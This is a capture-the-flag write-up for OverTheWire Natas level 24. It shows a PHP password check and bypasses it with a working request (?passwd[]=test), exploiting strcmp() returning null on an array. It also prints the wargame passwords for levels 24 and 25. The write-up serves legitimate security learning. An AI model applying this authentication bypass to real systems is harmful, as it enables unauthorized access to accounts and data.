# Natas Level 24

> Username: natas24

> Password: shlL4BvOtawNCd81dwdKRHFzmTEjYYQX

> URL: http://natas24.natas.labs.overthewire.org

## Solution

Entering the URL, we found a password input. Let's view the source code to find the weakness.

```php
<?php
    if(array_key_exists("passwd",$_REQUEST)){
        if(!strcmp($_REQUEST["passwd"],"<censored>")){
            echo "<br>The credentials for the next level are:<br>";
            echo "<pre>Username: natas25 Password: <censored></pre>";
        }
        else{
            echo "<br>Wrong!<br>";
        }
    }
    // morla / 10111
?>  
```

The level typically checks the password input using:
`if(!strcmp($_REQUEST["passwd"], "<censored>"))`

In older PHP versions, `strcmp()` expects two strings. But if you pass an array like `passwd[]=test` instead of a string, `strcmp()` fails to handle the array properly and returns `null` which loosely equals 0. And this will pass the `strcmp()` comparison.

```text
http://natas24.natas.labs.overthewire.org/?passwd[]=test
```

```text
The credentials for the next level are:
Username: natas25 Password: UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo
```

```text
UJEF5OAHF1eW3lqkpdCDM7ow4syzh4oo
```

